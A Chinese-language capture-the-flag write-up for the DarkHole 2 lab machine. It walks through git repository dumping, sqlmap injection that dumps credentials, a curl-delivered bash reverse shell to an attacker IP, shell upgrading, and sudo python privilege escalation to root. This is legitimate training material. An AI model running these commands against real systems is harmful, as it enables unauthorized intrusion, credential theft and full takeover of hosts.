# darkhole_2靶机-git文件漏洞

## 扫描IP地址

### 将靶机开关后分别进行扫描，从而找出靶机的ip地址

![73255100970](assets/1732551009708.png)

### 扫描靶机IP地址下的开放端口

- `nmap`：执行 Nmap 网络扫描工具。
- `-sC`：启用 Nmap 的 **默认脚本扫描**，即运行一些常用的脚本来检查目标的常见漏洞和服务信息。例如，常见的脚本包括检查 HTTP 服务的漏洞、SSL 配置、弱密码等。
- `-sV`：启用 **服务版本检测**，Nmap 会尝试识别目标主机开放端口上运行的服务及其版本。通过分析响应的特征，Nmap 可以猜测具体的服务版本号（如 Apache 2.4.29 或 MySQL 5.7.31）。
- `-p-`：扫描所有 TCP 端口（1-65535）。没有这个选项时，Nmap 只会扫描常见的前 1,000 个端口。此选项表示对目标主机的所有端口进行扫描。
- `192.168.52.134`：目标 IP 地址，是要扫描的主机。
- `-oN darkhole_2.nmap`：将扫描结果输出到文件 `darkhole_2.nmap`，使用 Nmap 的正常输出格式（文本格式），以便后续分析。

![73255104080](assets/1732551040809.png)

## 访问开放端口

根据扫描结果可知80端口是开放的，访问后页面如下

![73255107609](assets/1732551076095.png)

![73255109436](assets/1732551094366.png)

## 攻击

![73255111229](assets/1732551112296.png)

### 利用GitHack工具

![73259761757](assets/1732597617576.png)

完成后会在当前文件夹生成以目标IP为文件名的文件夹

![73259768458](assets/1732597684583.png)

### 查看php文件源码寻找有用信息

#### config..php

![73259789775](assets/1732597897755.png)

#### login.php

![73259793234](assets/1732597932348.png)

#### logout.php

![73259796714](assets/1732597967146.png)

#### index.php

![73259803453](assets/1732598034531.png)

#### dashboard.php

![73259808124](assets/1732598081243.png)

### 查看git提交日志：git-dumper

![73260037867](assets/1732600378674.png)

![73260039943](assets/1732600399432.png)

可以看到有是三次提交，第二次提交添加了login.php，我们可以查看第二次提交的源码

![73260051632](assets/1732600516321.png)

爆出了账号密码。

### SQL注入

通过账号密码成功登录

![73260061470](assets/1732600614705.png)

观察url发现有带参数，尝试使用SQL注入

#### 使用sqlmap进行sql注入

> 需要带上cookie才能进行爆破

![73260112346](assets/1732601123467.png)

检查到注入点，开始注入爆破

> sqlmap -u http://192.168.52.134/dashboard.php?id=1 --cookie PHPSESSID=6fume23o0b9pqaqs7g5368jjk1 --batch --dbs

![73260133162](assets/1732601331623.png)

> sqlmap -u http://192.168.52.134/dashboard.php?id=1 --cookie PHPSESSID=6fume23o0b9pqaqs7g5368jjk1 --batch -D darkhole_2 --tables
>

![73260140778](assets/1732601407787.png)

> sqlmap -u http://192.168.52.134/dashboard.php?id=1 --cookie PHPSESSID=6fume23o0b9pqaqs7g5368jjk1 --batch -D darkhole_2 -T users --dump
>

![73260145875](assets/1732601458751.png)

> sqlmap -u http://192.168.52.134/dashboard.php?id=1 --cookie PHPSESSID=6fume23o0b9pqaqs7g5368jjk1 --batch -D darkhole_2 -T ssh --dump
>

![73260150884](assets/1732601508844.png)

得到了ssh的账号密码，可以用于登录ssh

![73260170030](assets/1732601700301.png)

登录成功

### SSH登录后查看内部文件

![73260179667](assets/1732601796673.png)

并没有看到flag文件

查看.bash_history

![73260192069](assets/1732601920697.png)

发现大量9999端口下的操作，并且是命令执行程序和反弹shell的命令

查看端口开放情况

> netstat -ntlp

![73260198363](assets/1732601983635.png)

9999端口仍然开放，利用该端口

> curl "http://localhost:9999/?cmd=id"

![73260214384](assets/1732602143842.png)

返回的是losy用户，查看losy目录，发现了losy用户下的flag，我们要拿到的是root用户的flag，因此要进行提权

> DarkHole{'This_is_the_life_man_better_than_a_cruise'}

![73260227318](assets/1732602273180.png)



### 权限提升

> 反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。

#### 攻击机开启监听

![73260386809](assets/1732603868094.png)

#### 靶机执行反弹shell

> curl "http://localhost:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.52.130%2F4444%200%3E%261%27"

![73260390351](assets/1732603903516.png)

如上上图，反弹成功，切换到完整交互shell

> python3 -c 'import pty;pty.spawn("/bin/bash")'
> export TERM=xterm
> Ctrl+Z

![73260690587](assets/1732606905871.png)`

1. python3 -c 'import pty;pty.spawn("/bin/bash")'`：这命令会在目标主机上启动一个 Python 解释器，并执行一个内联命令（通过`-c`选项）。这个命令使用`pty`模块创建一个新的伪终端，并在这个伪终端中启动一个`/bin/bash`会话。这通常被称为“反弹 Shell”，因为它允许攻击者在自己的计算机上通过网络与目标主机的 Shell 进行交互，就像通过 Telnet 或 SSH 那样，但它是通过网络套接字实现的。
2. `export TERM=xterm`：攻击者为了确保后续的命令能正确地在目标主机的 Shell 中执行，设置了`TERM`环境变量为`xterm`。这有助于确保 Shell 的终端行为正确，从而避免显示和交互问题。
3. 接着，攻击者按下`Ctrl+Z`。这会导致当前正在执行的命令（即`python3 -c 'import pty;pty.spawn("/bin/bash")'`）被暂停，并将控制权返回给攻击者的本地终端（通常是 SSH 客户端）。这一点很重要，因为它允许攻击者在不终止反弹 Shell 会话的情况下，切换回自己的终端。

> 这个命令序列使得攻击者能够在目标主机上获得一个交互式的 Shell 会话，之后可以执行各种操作，如上传和下载文件、修改系统配置或安装恶意软件。

#### 调整终端设置

- `stty -a`：这个命令用于显示当前终端的所有属性，包括波特率、数据位、停止位、奇偶校验位等。通过这个命令，用户可以了解当前终端的设置情况。
- `stty raw -echo`：这个命令用于将终端设置为原始模式和禁止回显。原始模式是指终端将接收和发送所有字符，而不需要进行任何特殊处理。禁止回显意味着用户输入的字符不会显示在终端屏幕上。这个命令通常用于需要直接控制终端输入和输出的应用程序，例如串口通信或需要用户输入密码的程序。
- `fg`：这个命令用于将后台运行的任务或进程调回到前台。在这个例子中，它可能被用来恢复之前被暂停或后台运行的任务。
- `reset`：这个命令用于重置终端的设置，将其恢复到默认状态。它会清除所有的终端配置和环境变量，包括之前通过`stty`命令设置的属性。这个命令通常用于解决终端显示问题或重置终端到一个已知的初始状态。

![73260698836](assets/1732606988366.png)

- `stty rows 21 columns 137` 是一个命令，用于设置终端的行数和列数。在类 Unix 系统中，`stty` 是一个用于设置和显示终端特性的命令。

![73260450771](assets/1732604507716.png)



#### 再次查看bash_history

但是我的文件没有查看到密码和sudo -l的命令

如果能够顺利拿到密码，就可以直接使用python提权

- `sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'`：通过`python`语言调用`os`模块的`system`函数，用`sudo`命令获取到`root`权限，从而执行`/bin/sh`命令。目的是获取到目标主机的`root`权限，为后续的操作做准备。

```
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
id
cd /root
ls
cat root.txt
```

拿到root权限下的flag












